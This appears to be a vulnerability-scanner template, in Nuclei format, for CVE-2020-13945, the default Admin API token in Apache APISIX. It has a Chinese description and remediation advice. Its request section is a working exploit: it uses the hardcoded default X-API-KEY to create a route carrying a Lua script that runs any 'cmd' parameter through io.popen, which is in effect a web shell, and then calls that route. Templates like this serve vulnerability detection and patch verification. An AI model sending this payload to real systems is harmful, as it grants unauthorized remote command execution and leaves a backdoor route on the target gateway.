id: CVE-2020-13945
info:
  name: Apache APISIX's Admin API Default Access Token (RCE)
  author:
  - l0ne1y
  description: |-
    Apache APISIX Admin API 默认Token导致RCE漏洞
    Apache APISIX 是一个动态、实时、高性能的 API 网关，基于 Nginx 网络库和 etcd 实现， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。当使用者开启了Admin API，没有配置相应的IP访问策略，且没有修改配置文件Token的情况下，则攻击者利用Apache APISIX的默认Token即可访问Apache APISIX，从而控制APISIX网关。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E

    **临时修复方案**
    1.修改Apache APISIX配置文件中 conf/config.yaml 的admin_key，禁止使用默认Token
    2.若非必要，关闭Apache APISIX Admin API功能，或者增加IP访问限制。
requests:
- matchers:
  - type: word
    condition: and
    words:
    - '"action":"create"'
    - '"script":'
    - '"node":'
    - '{{fileName}}'
  - type: status
    status:
    - 201
  matchers-condition: and
  raw:
  - |
    POST /apisix/admin/routes HTTP/1.1
    Host: {{Hostname}}
    X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
    Content-Type: application/json

    {
      "uri":"/{{fileName}}",
      "script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
      "upstream":{
        "type":"roundrobin",
        "nodes":{
          "example.com:80":1
        }
      }
    }
  - |
    GET /{{fileName}}?cmd=echo {{fileName}} HTTP/1.1
    Host: {{Hostname}}
variables:
  fileName: '{{rand_text_alphanumeric(15,"")}}'
